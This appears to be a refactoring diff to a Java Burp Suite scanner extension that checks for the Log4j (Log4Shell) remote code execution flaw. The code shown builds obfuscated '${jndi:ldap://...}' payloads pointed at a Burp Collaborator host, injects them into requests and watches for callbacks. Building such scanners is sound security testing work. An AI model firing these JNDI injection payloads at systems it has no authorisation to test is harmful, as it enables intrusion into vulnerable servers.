@@ -1,15 +1,8 @@
 package BrianW.AKA.BigChan.PowerScanner;
 
-import BrianW.AKA.BigChan.Tools.CollaboratorData;
 import BrianW.AKA.BigChan.Tools.FetchCollaboratorWithSig;
-import BrianW.AKA.BigChan.Tools.Global;
-import BrianW.AKA.BigChan.Tools.utils;
+import BrianW.AKA.BigChan.Tools.Utils;
 import burp.*;
-
-import java.nio.charset.StandardCharsets;
-import java.util.Date;
-import java.util.List;
-import java.util.Locale;
 
 import static java.lang.Thread.sleep;
 
@@ -31,7 +24,7 @@ public class ScanLog4j extends Reporter {
         String baseValue = insertionPoint.getBaseValue();
         IBurpCollaboratorClientContext collaboratorContext = this.callbacks.createBurpCollaboratorClientContext();
         String collaboratorPayload = collaboratorContext.generatePayload(true);
-        String sig = utils.getRandomString(3).toLowerCase();
+        String sig = Utils.getRandomString(3).toLowerCase();
         String payload = genLog4jPayload(collaboratorPayload, sig);
 //        callbacks.printOutput(String.format("generate log4j2 RCE collaboratorPayload: %s.%s, final payload: %s", sig, collaboratorPayload, payload));
         byte[] reqEvil = insertionPoint.buildRequest((payload).getBytes());
@@ -65,7 +58,7 @@ public class ScanLog4j extends Reporter {
     }
 
     private static String genLog4jPayload(String dns, String sig) {
-        return String.format("%s${%s.%s}%s", utils.getRandomString(4), obfuscator("jndi:ldap://" + sig), obfuscator(dns), utils.getRandomString(4));
+        return String.format("%s${%s.%s}%s", Utils.getRandomString(4), obfuscator("jndi:ldap://" + sig), obfuscator(dns), Utils.getRandomString(4));
     }
 
     private static String obfuscator(String payload) {
